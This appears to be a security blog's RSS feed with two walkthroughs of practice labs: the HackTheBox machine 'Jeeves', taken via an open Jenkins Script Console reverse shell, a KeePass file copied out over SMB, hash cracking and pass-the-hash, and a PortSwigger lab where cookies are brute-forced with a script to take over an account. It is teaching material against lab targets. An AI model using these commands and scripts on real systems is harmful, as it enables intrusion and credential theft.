<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Broken Authentication on Ep1cac</title>
    <link>https://ep1cac.github.io/tags/broken-authentication/</link>
    <description>Recent content in Broken Authentication on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Mon, 11 Nov 2024 12:54:22 -0600</lastBuildDate><atom:link href="https://ep1cac.github.io/tags/broken-authentication/index.xml" rel="self" type="application/rss+xml" /><icon>https://ep1cac.github.io/logo.svg</icon>
    
    
    <item>
      <title>Jeeves</title>
      <link>https://ep1cac.github.io/posts/jeeves/</link>
      <pubDate>Mon, 11 Nov 2024 12:54:22 -0600</pubDate>
      
      <guid>https://ep1cac.github.io/posts/jeeves/</guid>
      <description><![CDATA[<p><img src="/img/jeeves/jeeves.png#center" alt="Jeeves"></p>
<h3 id="description">Description</h3>
<p>Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator&rsquo;s NTLM hash.</p>
<h3 id="recon">Recon</h3>
<p>Starting off with a nmap scan:</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Mon Nov 11 12:55:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-12T00:05:55
|_  start_date: 2024-11-11T23:57:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.96 ms 10.10.14.1
2   45.71 ms 10.10.10.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 13:05:35 2024 -- 1 IP address (1 host up) scanned in 214.46 seconds
</code></pre><p>I found several services, including SMB, RPC, and two HTTP servers on ports 80 and 50000. Enumerating the web server on port 80 and SMB do not reveal anything interesting. I was able to use RPC to find some endpoints, but I did not see anyway I could exploit Jeeves with the information.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -p 135 10.10.10.63
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.10.63
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.63[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]
          ncalrpc:[WMsgKRpc097A31]

Protocol: N/A 
Provider: N/A 
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
Bindings: 
          ncalrpc:[LRPC-f01d6a34deb1026cb0]
          ncalrpc:[dabrpc]
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-f24b240fdec2bc8c52]
          ncalrpc:[LRPC-bb6163cae863dbd5f9]
          ncalrpc:[LRPC-82dd959ab6b7e8366d]
          ncacn_np:\\JEEVES[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-300bf2e2daeee2de9a]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

...
</code></pre><p>However, I did find an interesting directory on the port 50000 website.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -C 404 -n
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves =&gt; http://10.10.10.63:50000/askjeeves/
[####################] - 2m    119601/119601  0s      found:1       errors:0      
[####################] - 2m    119601/119601  1048/s  http://10.10.10.63:50000/
</code></pre><p>We find a Jenkins dashboard.</p>
<p><img src="/img/jeeves/jenkins_web.png" alt="Jenkins Server"></p>
<p>Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking <code>config.xml</code> and finding the unsecured authorization strategy in use.</p>
<p><code>&lt;authorizationStrategy class=&quot;hudson.security.AuthorizationStrategy$Unsecured&quot;/&gt;</code></p>
<h3 id="foothold">Foothold</h3>
<p>We can leverage our permissions to access the Script Console by going to &ldquo;Mange Jenkins&rdquo; &gt; &ldquo;Script Console&rdquo;.</p>
<p><img src="/img/jeeves/script_console.png" alt="Jenkins Script Console"></p>
<p>Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.63] 49681
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins&gt;
</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
<p>I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.</p>
<pre tabindex="0"><code>C:\Temp&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</code></pre><p>Unfortunately, this turns out to be a false lead. We&rsquo;ll have to look for other privesc vectors.</p>
<pre tabindex="0"><code>C:\Temp&gt;.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
[*] CombaseModule: 0x140717164658688
[*] DispatchTable: 0x140717166622152
[*] UseProtseqFunction: 0x140717166124880
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0f34-ffff-9033-ef4aa84d1797
[*] DCOM obj OXID: 0xb7f5e435d7866f08
[*] DCOM obj OID: 0x59d6cba54f6519d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
</code></pre><p>Eventually, I come across a KeePass database file.</p>
<pre tabindex="0"><code>C:\&gt;dir /s /b *.kdbx
dir /s /b *.kdbx
C:\Users\kohsuke\Documents\CEH.kdbx
</code></pre><p>KeePass files are password-protected and I don&rsquo;t have the utilities to crack the password on Jeeves, so I set up a SMB share to exfiltrate the file to my attacker machine.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-smbserver transfer /tmp/transfer -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Now to mount the share and transfer CEH.kdbx.</p>
<pre tabindex="0"><code>C:\Users\kohsuke\Documents&gt;net use M: \\10.10.14.31\transfer
net use M: \\10.10.14.31\transfer
The command completed successfully.


C:\Users\kohsuke\Documents&gt;copy CEH.kdbx M:
copy CEH.kdbx M:
        1 file(s) copied.
</code></pre><p>Next we can extract the KeePass password hash and crack it.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/transfer]
└─$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/transfer]
└─$ hashcat -a 0 &#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48&#39; /usr/share/wordlists/rockyou.txt -m 13400
</code></pre><p>We get the password <code>moonshine1</code>. We can now view the contents of CEH.kdbx.</p>
<pre tabindex="0"><code>kpcli:/&gt; ls
=== Groups ===
CEH/
kpcli:/&gt; cd CEH
kpcli:/CEH&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH&gt; 
</code></pre><p>Inside the CEH groups, we find some entries and more groups. Further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; ls *
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

/CEH/eMail:

/CEH/General:

/CEH/Homebanking:

/CEH/Internet:

/CEH/Network:

/CEH/Windows:
</code></pre><p>There are usernames and password hashes in the entries. I created a user wordlist as well as a password wordlist and sprayed them against Jeeves. In retrospect, this was not necessary since most of these users do not exist on the machine, so I could&rsquo;ve narrowed down my users to <code>Administrator</code>.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH&gt; show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH&gt; show -f 4

Title: It&#39;s a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH&gt; show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don&#39;t even need creds! Unhackable! 

kpcli:/CEH&gt; show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
</code></pre><p>None of the passwords worked, so I tried a pass-the-hash attack using the hash in entry 0 and gained access to the Administrator account.</p>
<p><img src="/img/jeeves/pwned.png" alt="Pass-the-hash"></p>
<p>And with that, Jeeves is owned.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-psexec Administrator@10.10.10.63 -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EXTSwcYV.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service ShHJ on 10.10.10.63.....
[*] Starting service ShHJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; 
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Portswigger Lab: Brute-forcing a stay-logged-in cookie</title>
      <link>https://ep1cac.github.io/posts/cookie_brute/</link>
      <pubDate>Mon, 23 Sep 2024 10:59:43 -0500</pubDate>
      
      <guid>https://ep1cac.github.io/posts/cookie_brute/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>The &ldquo;Brute-forcing a stay-logged-in cookie&rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>Navigate to the login page under &ldquo;My account&rdquo;. We will first create a stay-logged-in cookie with the user credentials given to us. Make sure check &ldquo;Stay logged in&rdquo;.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in.png" alt="Login and enable persistent cookies"></p>
<p>Now we can copy the cookie to analyze. Hit <code>Ctr-Shift-i</code> to open the Developer Tools panel and head to the &ldquo;Storage&rdquo; section. The value for the &ldquo;stay-logged-on&rdquo; field is our cookie.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in_cookie.png" alt="Stay-logged-in cookie"></p>
<p>The cookie is encoded in base64. Decoding it reveals that it is composed of the our username, &ldquo;:&rdquo;, and a hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo &#39;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&#39; | base64 -d                                    
wiener:51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>Given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. In this case, it&rsquo;s the MD5 hash of our password. We can confirm this by hashing our password using MD5 and verifying it is identical to the hash in our cookie.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo -n &#39;peter&#39; | md5sum | cut -d &#39; &#39; -f1 
51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>We have now determined that the stay-logged-in cookie is <code>username:&lt;password MD5 hash&gt;</code> and base64-encoded. Since we have already been given a <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">list of passwords</a>, we can create a list of potential cookies for <code>carlos</code> by applying these rules. I provided a script that does this and saves the cookies into <code>cookies.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Now we can brute force the stay-logged-in cookie for <code>carlos</code>. Logout and start Burp Suite. We are going to login again as <code>wiener</code> again, but this time we are going to intercept our web requests. Forward the POST request but capture the GET request for your account details.</p>
<p><img src="/img/portswigger/cookie-brute/persistent_logon.png" alt="Web request"></p>
<p>Copy it and save it into a file. Change the <code>id</code> query string&rsquo;s value to <code>carlos</code> and replace the stay-logged-in cookie with <code>FUZZ</code>. Now, we can brute force the cookie.</p>
<pre tabindex="0"><code>ffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:FUZZ -r
</code></pre><p>We see a change in the webserver&rsquo;s response after supplying one of the cookies.</p>
<p><img src="/img/portswigger/cookie-brute/success.png" alt="Cookie brute force"></p>
<p>Now we can simply use our cookie to take over  <code>carlos</code>. Once again, we open the developer tools and head to storage &gt; cookies. Right click and add another item with the name as &ldquo;stay-logged-in&rdquo; and the value as the cookie we got.</p>
<p><img src="/img/portswigger/cookie-brute/add_cookie.png" alt="Add carlos&rsquo; cookie"></p>
<p>Refresh the page and we are now logged in as <code>carlos</code>.</p>
<p><img src="/img/portswigger/cookie-brute/carlos_pwned.png" alt="Takeover success"></p>
<hr>
<h3 id="beyond-pwn">Beyond Pwn</h3>
<p>Note that finding the cookie for <code>carlos</code> is similar to a password dictionary attack. In this particular though, there is a IP ban for incorrect login attempts. By brute forcing the cookie instead of password, we are able to bypass the IP ban.</p>
<p>Also worth mentioning is that we can also get the <code>carlos</code> user&rsquo;s password while brute forcing his cookie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie &amp;&amp; cookie-password map</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">: </span>$line<span style="color:#e6db74">&#34;</span> &gt;&gt; map.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Once we successfully authenticate with a cookie, we can find its corresponding password through the map.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ grep &#39;Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx&#39; map.txt                    
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx: thomas
</code></pre><p>This can be useful when checking for password reuse and may help us access more services in a real engagement.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
